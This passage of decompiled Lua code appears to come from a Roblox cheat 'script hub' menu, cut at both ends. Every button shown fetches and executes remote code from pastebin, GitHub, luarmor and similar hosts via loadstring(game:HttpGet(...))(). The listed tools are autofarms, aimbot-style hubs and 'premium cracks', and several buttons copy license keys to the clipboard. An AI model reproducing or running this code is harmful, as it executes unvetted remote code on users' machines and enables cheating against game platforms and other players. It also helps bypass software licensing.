      })
      r13_4:AddButton({
        Name = "Website to get the key (click to copy)",
        Callback = function()
          -- line: [0, 0] id: 342
          setclipboard("https://gamelean.games/script.html")
        end,
      })
      r13_4:AddButton({
        Name = "147. The Rake Remastered - Zeerox Hub",
        Callback = function()
          -- line: [0, 0] id: 725
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "The Rake Remastered - Project Hub",
        Callback = function()
          -- line: [0, 0] id: 691
          loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/DesertDetectorslua/refs/heads/main/.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "148. The Ride - Money Autofarm",
        Callback = function()
          -- line: [0, 0] id: 51
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/the%20ride2", true))()
        end,
      })
      r13_4:AddButton({
        Name = "149. Touch Football - Good Script",
        Callback = function()
          -- line: [0, 0] id: 290
          loadstring(game:HttpGet("https://pastebin.com/raw/QcUAEuLN"))()
        end,
      })
      r13_4:AddButton({
        Name = "150. Typical Colors 2 - Aegis Hub",
        Callback = function()
          -- line: [0, 0] id: 361
          loadstring(game:HttpGet("https://pastebin.com/raw/sSRgUNKH"))()
        end,
      })
      r13_4:AddButton({
        Name = "Typical Colors 2 - Game Enhancer Pro",
        Callback = function()
          -- line: [0, 0] id: 702
          loadstring(game:HttpGet("https://pastebin.com/raw/ZP7JrSYt"))()
        end,
      })
      r13_4:AddButton({
        Name = "151. Trench War - Good Script",
        Callback = function()
          -- line: [0, 0] id: 115
          loadstring(game:HttpGet("https://pastebin.com/raw/3izBa8XU"))()
        end,
      })
      r13_4:AddButton({
        Name = "Trench War - Astolfo Hub",
        Callback = function()
          -- line: [0, 0] id: 235
          loadstring(game:HttpGet("https://pastebin.com/raw/uXxB1P4d"))()
        end,
      })
      r13_4:AddButton({
        Name = "152. The Floor Is Lava - CH Hub",
        Callback = function()
          -- line: [0, 0] id: 381
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/CHHub/main/CHHub.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "The Floor Is Lava - Good Script",
        Callback = function()
          -- line: [0, 0] id: 564
          loadstring(game:HttpGet("https://github.com/KhSaeed90/Roblox/raw/workspace/815405518"))()
        end,
      })
      r13_4:AddButton({
        Name = "Key For This Script (click to copy)",
        Callback = function()
          -- line: [0, 0] id: 419
          setclipboard("e350b00031a8d63e99a105b756269140")
        end,
      })
      r13_4:AddButton({
        Name = "153. Untitled Boxing Game - Beanz Hub",
        Callback = function()
          -- line: [0, 0] id: 578
          loadstring(game:HttpGet("https://raw.githubusercontent.com/pid4k/scripts/refs/heads/main/untitledboxinggame.lua", true))()
        end,
      })
      r13_4:AddButton({
        Name = "154. Volleyball Legends - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 282
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/vol/refs/heads/main/ball"))()
        end,
      })
      r13_4:AddButton({
        Name = "Volleyball Legends - Resonance Hub (Good Script)",
        Callback = function()
          -- line: [0, 0] id: 175
          loadstring(game:HttpGet("https://raw.githubusercontent.com/roscripts749/loader/refs/heads/main/loader"))()
        end,
      })
      r13_4:AddButton({
        Name = "Volleyball Legends - Sterling Hub",
        Callback = function()
          -- line: [0, 0] id: 120
          loadstring(game:HttpGet("https://pastebin.com/raw/EFYNg90R"))()
        end,
      })
      r13_4:AddButton({
        Name = "Volleyball Legends - Lunax Hub",
        Callback = function()
          -- line: [0, 0] id: 558
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Alexisisback/Lunax/refs/heads/main/Loader.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "155. Void Fishing - Auto Farming GUI",
        Callback = function()
          -- line: [0, 0] id: 408
          loadstring(game:HttpGet("https://pastebin.com/raw/xajBq0dk"))()
        end,
      })
      r13_4:AddButton({
        Name = "156. Verse Piece - NS Hub",
        Callback = function()
          -- line: [0, 0] id: 260
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/pi/refs/heads/main/ie"))()
        end,
      })
      r13_4:AddButton({
        Name = "157. War Machines - Autofarm And More",
        Callback = function()
          -- line: [0, 0] id: 661
          loadstring(game:HttpGet("https://pastebin.com/raw/NTQ3Tszv"))()
        end,
      })
      r13_4:AddButton({
        Name = "158. Wizard West - N-Hub",
        Callback = function()
          -- line: [0, 0] id: 733
          loadstring(game:HttpGet("https://raw.githubusercontent.com/NannoAutomata/nannohub/refs/heads/main/wizardfarmbynannodev.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Wizard West - True Hub",
        Callback = function()
          -- line: [0, 0] id: 692
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptHubTrue/TrueHub/refs/heads/main/WizardWestV2"))()
        end,
      })
      r13_4:AddButton({
        Name = "159. Word Bomb - Auto Type \n(Press V to increase WPM and B to decrease)",
        Callback = function()
          -- line: [0, 0] id: 182
          loadstring(game:HttpGet("https://raw.githubusercontent.com/forgebin/roblox/main/wordbomb.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "Word Bomb - Word Searcher",
        Callback = function()
          -- line: [0, 0] id: 96
          loadstring(game:HttpGet("https://alexv.netlify.app/otherscripts/wordbomb.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "160. Yeet A Friend - Luxury Hub",
        Callback = function()
          -- line: [0, 0] id: 300
          loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/jhgntyujr", true))()
        end,
      })
      r13_4:AddButton({
        Name = "161. YouTube Simulator Z - Auto Click E",
        Callback = function()
          -- line: [0, 0] id: 472
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ScPtD/scripts/main/YouTube%20Simulator%20Z%20script.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "162. Youtuber Tycoon - Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 432
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/YoutuberTycoon.lua"))()
        end,
      })
      r13_4:AddButton({
        Name = "163. Zombie Uprising - Moonlight Client",
        Callback = function()
          -- line: [0, 0] id: 339
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ObviouslyOrchi/Moonlight_Client.lua/main/Universal", true))()
        end,
      })
      local r14_4 = r4_4:MakeTab({
        Name = "3008",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r14_4:AddButton({
        Name = "Zeerox Hub",
        Callback = function()
          -- line: [0, 0] id: 456
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua"))()
        end,
      })
      r14_4:AddButton({
        Name = "Rifk Hub (Press Q When You Run The Script)",
        Callback = function()
          -- line: [0, 0] id: 624
          loadstring(game:HttpGet("https://pastebin.com/raw/ve3KXuJ8"))()
        end,
      })
      r14_4:AddButton({
        Name = "Sky Hub",
        Callback = function()
          -- line: [0, 0] id: 11
          loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
        end,
      })
      r14_4:AddButton({
        Name = "Rinns Hub",
        Callback = function()
          -- line: [0, 0] id: 454
          loadstring(game:HttpGet("https://raw.githubusercontent.com/R1nn1/MainMenu1/main/MainMenuV1.2"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Anime Vanguards",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "NukeVsCity Hub",
        Callback = function()
          -- line: [0, 0] id: 449
          loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/Scripts2024/refs/heads/main/AnimeVanguards"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Adopt Me",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Prodigy X",
        Callback = function()
          -- line: [0, 0] id: 54
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua", true))()
        end,
      })
      r4_4:MakeTab({
        Name = "Anime Dimensions Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "SLH Hub",
        Callback = function()
          -- line: [0, 0] id: 151
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Yanwanlnwza/SmellLikeHacker/main/Animedimensions.lua"))()
        end,
      })
      local r18_4 = r4_4:MakeTab({
        Name = "Anime Slashing Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r18_4:AddButton({
        Name = "Nami Hub",
        Callback = function()
          -- line: [0, 0] id: 132
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ByNami/dkhub/main/Script", true))()
        end,
      })
      r18_4:AddButton({
        Name = "Inf All",
        Callback = function()
          -- line: [0, 0] id: 136
          loadstring(game:HttpGet("https://pastebin.com/raw/Kd9p9Gxz"))()
        end,
      })
      local r19_4 = r4_4:MakeTab({
        Name = "Anime Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r19_4:AddButton({
        Name = "Lyzer Hub",
        Callback = function()
          -- line: [0, 0] id: 641
          loadstring(game:HttpGet("https://you.whimper.xyz/lyzer"))()
        end,
      })
      r19_4:AddButton({
        Name = "NS Hub",
        Callback = function()
          -- line: [0, 0] id: 724
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/real/main/fakee"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Anime Dungeon Fighters",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Nami Hub",
        Callback = function()
          -- line: [0, 0] id: 667
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ByNami/dkhub/main/Script", true))()
        end,
      })
      local r21_4 = r4_4:MakeTab({
        Name = "Anime Card Battle",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r21_4:AddButton({
        Name = "Ali Hub",
        Callback = function()
          -- line: [0, 0] id: 49
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AliCode14/scripts/main/AnimeCardBattle.lua"))()
        end,
      })
      r21_4:AddButton({
        Name = "Rinns Hub",
        Callback = function()
          -- line: [0, 0] id: 734
          loadstring(game:HttpGet("https://raw.githubusercontent.com/R1nn1/MainMenu1/main/MainMenuV1.2"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Animal Attack",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Animal Attack Script",
        Callback = function()
          -- line: [0, 0] id: 92
          loadstring(game:HttpGet("https://gist.githubusercontent.com/ExploiterGuy/2ff40247d9bf9359e442730776509ee7/raw/8e3a5b6c8dd415ac2794c2fea5f858cd55d2fb10/Animal%2520Attack!%2520%255BLION%255D"))()
        end,
      })
      local r23_4 = r4_4:MakeTab({
        Name = "Arsenal",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r23_4:AddButton({
        Name = "Champion X",
        Callback = function()
          -- line: [0, 0] id: 375
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ZxenoLR/Champion/refs/heads/main/Loader/Loader.luau"))()
        end,
      })
      r23_4:AddButton({
        Name = "Solaris.lol",
        Callback = function()
          -- line: [0, 0] id: 409
          loadstring(game:HttpGet("https://raw.githubusercontent.com/toasty-dev/pissblox/main/solaris_bootstrapper.lua", true))()
        end,
      })
      r23_4:AddButton({
        Name = "Quotas Hub",
        Callback = function()
          -- line: [0, 0] id: 666
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Insertl/QuotasHub/main/BETAv1.3"))()
        end,
      })
      r23_4:AddButton({
        Name = "Vapa V2",
        Callback = function()
          -- line: [0, 0] id: 527
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Nickyangtpe/Vapa-v2/refs/heads/main/Vapav2-Arsenal.lua", true))()
        end,
      })
      r23_4:AddButton({
        Name = "Tekkit Hub",
        Callback = function()
          -- line: [0, 0] id: 26
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/tekkit"))()
        end,
      })
      r23_4:AddButton({
        Name = "Express Hub",
        Callback = function()
          -- line: [0, 0] id: 390
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
        end,
      })
      local r24_4 = r4_4:MakeTab({
        Name = "A Dusty Trip",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r24_4:AddButton({
        Name = "Connect Hub",
        Callback = function()
          -- line: [0, 0] id: 277
          loadstring(game:HttpGet("https://raw.githubusercontent.com/xxqLgnd/Utilities/main/DustyTrip", true))()
        end,
      })
      r24_4:AddButton({
        Name = "Thac Hub",
        Callback = function()
          -- line: [0, 0] id: 333
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ThacG/DustyTripThac/main/dustytripthac"))()
        end,
      })
      local r25_4 = r4_4:MakeTab({
        Name = "A Universal Time",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r25_4:AddButton({
        Name = "Finger Farm",
        Callback = function()
          -- line: [0, 0] id: 296
          getgenv().DodgeOffset = 400
          getgenv().OneShotTime = 223
          getgenv().AutoSkills = {
            "E",
            "R",
            "Y"
          }
          getgenv().AutoAscend = 0
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebula-Manta/StingrayCracker/refs/heads/main/FingerFarm"))()
        end,
      })
      r25_4:AddButton({
        Name = "Auto Farm",
        Callback = function()
          -- line: [0, 0] id: 73
          loadstring(game:HttpGet("https://pastebin.com/raw/nxxZ6Q62"))()
        end,
      })
      local r26_4 = r4_4:MakeTab({
        Name = "Ability Wars",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r26_4:AddButton({
        Name = "Komaru Hub",
        Callback = function()
          -- line: [0, 0] id: 410
          loadstring(game:HttpGet("https://raw.githubusercontent.com/railme37509124/komaruhubabilitywars/main/script.lua"))()
        end,
      })
      r26_4:AddButton({
        Name = "Pulse Hub",
        Callback = function()
          -- line: [0, 0] id: 119
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Chavels123/Loader/refs/heads/main/loader.lua"))()
        end,
      })
      r26_4:AddButton({
        Name = "Vystro Hub",
        Callback = function()
          -- line: [0, 0] id: 431
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Chromeyc/roblox/refs/heads/main/Vystro%20Hub/Games/main.lua"))()
        end,
      })
      r26_4:AddButton({
        Name = "Combat Bot (Idk If Working)",
        Callback = function()
          -- line: [0, 0] id: 18
          loadstring(game:HttpGet("https://raw.githubusercontent.com/pogi1010/Com299jsjsnsjjsnwjq/main/Comksjajajajja"))()
        end,
      })
      local r27_4 = r4_4:MakeTab({
        Name = "Aqua Racer",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r27_4:AddButton({
        Name = "Aqua Racer Script",
        Callback = function()
          -- line: [0, 0] id: 231
          loadstring(game:HttpGet("https://pastebin.com/raw/PkhkrfVx"))()
        end,
      })
      r27_4:AddButton({
        Name = "Tora Hub",
        Callback = function()
          -- line: [0, 0] id: 311
          loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/main/AquaRacer"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Attack On Titan Revolution",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Tekkit Hub (premium crack)",
        Callback = function()
          -- line: [0, 0] id: 117
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/tekkit"))()
        end,
      })
      local r29_4 = r4_4:MakeTab({
        Name = "Animal Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r29_4:AddButton({
        Name = "Wolf Hub",
        Callback = function()
          -- line: [0, 0] id: 368
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CrowzScripts/AnimalSim/refs/heads/main/WolfScript"))()
        end,
      })
      r29_4:AddButton({
        Name = "Petite Hub",
        Callback = function()
          -- line: [0, 0] id: 586
          loadstring(game:HttpGet("https://raw.githubusercontent.com/petitebarte/menu/main/Menu"))()
        end,
      })
      r29_4:AddButton({
        Name = "LT Hub",
        Callback = function()
          -- line: [0, 0] id: 552
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Hercules4328/AnimalSimulator/refs/heads/main/LTFRUITS1.9", true))()
        end,
      })
      r29_4:AddButton({
        Name = "Key For LT Hub (click to copy)",
        Callback = function()
          -- line: [0, 0] id: 125
          setclipboard("6f16d9426ec8ce1e09870a47fdd5c9cc")
        end,
      })
      local r30_4 = r4_4:MakeTab({
        Name = "Animal Sim: Underwater",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r30_4:AddButton({
        Name = "Ethus Hub",
        Callback = function()
          -- line: [0, 0] id: 426
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Hercules4328/UnderwaterBR/main/UnderwaterBr", true))()
        end,
      })
      r30_4:AddButton({
        Name = "Key For Ethus Hub (click to copy)",
        Callback = function()
          -- line: [0, 0] id: 386
          setclipboard("6c45bb10ffdfQÅ2ef2ee9")
        end,
      })
      local r31_4 = r4_4:MakeTab({
        Name = "Bubble Gum Simulator INFINITY",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r31_4:AddButton({
        Name = "Speed Hub X (Best Script)",
        Callback = function()
          -- line: [0, 0] id: 17
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
        end,
      })
      r31_4:AddButton({
        Name = "Noodle Hub",
        Callback = function()
          -- line: [0, 0] id: 42
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ccdad1ca682e93c37c06f5d84e65fecb.lua"))()
        end,
      })
      r31_4:AddButton({
        Name = "Vertex Hub",
        Callback = function()
          -- line: [0, 0] id: 757
          loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
        end,
      })
      r31_4:AddButton({
        Name = "Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 520
          loadstring(game:HttpGet(request({
            Url = "https://aussie.productions/script",
          }).Body))()
        end,
      })
      r31_4:AddButton({
        Name = "Connect Hub",
        Callback = function()
          -- line: [0, 0] id: 64
          loadstring(game:HttpGet("https://raw.githubusercontent.com/xxqLgnd/Utilities/main/BubbleGum.lua", true))()
        end,
      })
      r31_4:AddButton({
        Name = "Ather Hub",
        Callback = function()
          -- line: [0, 0] id: 553
          script_key = "Add key here to auto verify"
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2529a5f9dfddd5523ca4e22f21cceffa.lua"))()
        end,
      })
      local r32_4 = r4_4:MakeTab({
        Name = "Blox Fruits",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r32_4:AddButton({
        Name = "Redz Hub (Very Good Script)",
        Callback = function()
          -- line: [0, 0] id: 595
          loadstring(game:HttpGet("https://raw.githubusercontent.com/newredz/BloxFruits/refs/heads/main/Source.luau"))()
        end,
      })
      r32_4:AddButton({
        Name = "Ronix Hub (Also Very Good)",
        Callback = function()
          -- line: [0, 0] id: 589
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b2db2af40b53ef0a502f6d561b4c6449.lua"))()
        end,
      })
      r32_4:AddButton({
        Name = "Speed Hub X",
        Callback = function()
          -- line: [0, 0] id: 622
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
        end,
      })
      r32_4:AddButton({
        Name = "Zenith Hub",
        Callback = function()
          -- line: [0, 0] id: 405
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
        end,
      })
      r32_4:AddButton({
        Name = "Flow Hub",
        Callback = function()
          -- line: [0, 0] id: 353
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Yumiara/Overflow/refs/heads/main/Main.lua"))()
        end,
      })
      r32_4:AddButton({
        Name = "Kncrypt Hub",
        Callback = function()
          -- line: [0, 0] id: 459
          loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/Kncrypt/refs/heads/main/sources/BloxFruit.lua"))()
        end,
      })
      r32_4:AddButton({
        Name = "Tekkit Hub",
        Callback = function()
          -- line: [0, 0] id: 401
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/tekkit"))()
        end,
      })
      r32_4:AddButton({
        Name = "Alter Hub",
        Callback = function()
          -- line: [0, 0] id: 270
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/alterhub"))()
        end,
      })
      r32_4:AddLabel("If it requires you to enter a key in Alter Hub, here it is: 25ms")
      local r33_4 = r4_4:MakeTab({
        Name = "Brookhaven",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r33_4:AddButton({
        Name = "The Darkones Hub",
        Callback = function()
          -- line: [0, 0] id: 597
          loadstring(game:HttpGet("https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/main/Brook%20Haven%20Gui"))()
        end,
      })
      r33_4:AddButton({
        Name = "Sander XY",
        Callback = function()
          -- line: [0, 0] id: 565
          loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns/testUIDK/refs/heads/main/panel.lua"))()
        end,
      })
      r33_4:AddButton({
        Name = "SP Hub",
        Callback = function()
          -- line: [0, 0] id: 698
          loadstring(game:HttpGet("https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/Brookhaven"))()
        end,
      })
      r33_4:AddButton({
        Name = "Mango Hub",
        Callback = function()
          -- line: [0, 0] id: 365
          loadstring(game:HttpGet("https://raw.githubusercontent.com/rogelioajax/lua/main/MangoHub", true))()
        end,
      })
      local r34_4 = r4_4:MakeTab({
        Name = "Blade Ball",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r34_4:AddButton({
        Name = "Plutonium Hub (Very Good Script)",
        Callback = function()
          -- line: [0, 0] id: 36
          loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
        end,
      })
      r34_4:AddButton({
        Name = "insanity.xyz (Key: KEY_p96fHJh2uB)",
        Callback = function()
          -- line: [0, 0] id: 540
          loadstring(game:HttpGet("https://raw.githubusercontent.com/jaysterrz/insanity.xyz/refs/heads/main/InsanityLoader.lua"))()
        end,
      })
      r34_4:AddButton({
        Name = "The Darkones Hub",
        Callback = function()
          -- line: [0, 0] id: 606
          loadstring(game:HttpGet("https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/refs/heads/main/BladeBall%20GUI"))()
        end,
      })
      r34_4:AddButton({
        Name = "FFJ Hub",
        Callback = function()
          -- line: [0, 0] id: 629
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/FFJV3"))("gg")
        end,
      })
      r34_4:AddButton({
        Name = "Pitbull Hub X",
        Callback = function()
          -- line: [0, 0] id: 579
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SoyAdriYT/PitbullHubX/refs/heads/main/PitbullHubX.lua", true))()
        end,
      })
      r34_4:AddButton({
        Name = "Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 523
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        end,
      })
      r34_4:AddButton({
        Name = "Femboys Hub",
        Callback = function()
          -- line: [0, 0] id: 445
          loadstring(game:HttpGet("https://raw.githubusercontent.com/LarsScripts/BladeBall/refs/heads/main/FemboysHub", true))()
        end,
      })
      local r35_4 = r4_4:MakeTab({
        Name = "Bedwars",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r35_4:AddButton({
        Name = "Vape V4",
        Callback = function()
          -- line: [0, 0] id: 75
          loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
        end,
      })
      r35_4:AddButton({
        Name = "Aurora Hub",
        Callback = function()
          -- line: [0, 0] id: 204
          loadstring(game:HttpGet("https://raw.githubusercontent.com/cocotv666/Aurora/refs/heads/main/Aurora_Loader"))()
        end,
      })
      r35_4:AddButton({
        Name = "Void Ware",
        Callback = function()
          -- line: [0, 0] id: 369
          loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/vapevoidware/main/NewMainScript.lua", true))()
        end,
      })
      local r36_4 = r4_4:MakeTab({
        Name = "Bee Swarm Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r36_4:AddButton({
        Name = "Kron Hub",
        Callback = function()
          -- line: [0, 0] id: 374
          loadstring(game:HttpGet("https://raw.githubusercontent.com/DevKron/Kron_Hub/refs/heads/main/version_1.0"))("")
        end,
      })
      r36_4:AddButton({
        Name = "Beecon Hub",
        Callback = function()
          -- line: [0, 0] id: 682
          loadstring(game:HttpGet("https://you.whimper.xyz/BeeconBeeswarm"))()
        end,
      })
      r36_4:AddButton({
        Name = "Express Hub",
        Callback = function()
          -- line: [0, 0] id: 436
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
        end,
      })
      r36_4:AddButton({
        Name = "Historia Hub",
        Callback = function()
          -- line: [0, 0] id: 165
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Historia00012/HISTORIAHUB/main/BSS%20FREE"))()
        end,
      })
      r36_4:AddLabel("Autofarm doesn\'t work on Historia Hub")
      local r37_4 = r4_4:MakeTab({
        Name = "Basketball Legends",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r37_4:AddButton({
        Name = "WEMG",
        Callback = function()
          -- line: [0, 0] id: 364
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/wemg"))()
        end,
      })
      r37_4:AddButton({
        Name = "Atlas Hub",
        Callback = function()
          -- line: [0, 0] id: 491
          getgenv().dontoffline = false
          _G.AtlasHubSafeMode = false
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/atlas"))()
        end,
      })
      r37_4:AddButton({
        Name = "Absence Hub",
        Callback = function()
          -- line: [0, 0] id: 209
          loadstring(game:HttpGet("https://raw.githubusercontent.com/vnausea/absence-mini/refs/heads/main/absencemini.lua"))()
        end,
      })
      r37_4:AddButton({
        Name = "OBF Hub (Very Bad Script)",
        Callback = function()
          -- line: [0, 0] id: 194
          _G.OBFHUBFREE = "2kmembersgang"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/obfhub/free/main/basketmball"))()
        end,
      })
      local r38_4 = r4_4:MakeTab({
        Name = "Break In",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r38_4:AddButton({
        Name = "X-Hub",
        Callback = function()
          -- line: [0, 0] id: 79
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/XHub/main/HubLoader.lua", true))()
        end,
      })
      r38_4:AddButton({
        Name = "Bebo Hub",
        Callback = function()
          -- line: [0, 0] id: 331
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/BreakInStory.lua"))()
        end,
      })
      r38_4:AddButton({
        Name = "Open Hub",
        Callback = function()
          -- line: [0, 0] id: 413
          loadstring(game:HttpGet("https://rawscripts.net/raw/Break-In-(Story)-Open-Source-3527", true))()
        end,
      })
      r4_4:MakeTab({
        Name = "Break In 2",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Starry Hub",
        Callback = function()
          -- line: [0, 0] id: 450
          loadstring(game:HttpGet("https://luau.tech/build"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Be NPC Or Die",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "UB Hub",
        Callback = function()
          -- line: [0, 0] id: 566
          loadstring(game:HttpGet("https://gitlab.com/r_soft/main/-/raw/main/LoadUB.lua", true))()
        end,
      })
      r4_4:MakeTab({
        Name = "Baddies",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 208
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/Baddies.lua"))()
        end,
      })
      local r42_4 = r4_4:MakeTab({
        Name = "Build A Boat For Treasure",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r42_4:AddButton({
        Name = "Best Script",
        Callback = function()
          -- line: [0, 0] id: 457
          loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRealAsu/BABFT/refs/heads/main/Jan25_Source.lua"))()
        end,
      })
      r42_4:AddButton({
        Name = "Only Autofarm Gold",
        Callback = function()
          -- line: [0, 0] id: 718
          loadstring(game:HttpGet("https://orbitsc.net/babft"))()
        end,
      })
      r42_4:AddButton({
        Name = "Zeerox Hub",
        Callback = function()
          -- line: [0, 0] id: 774
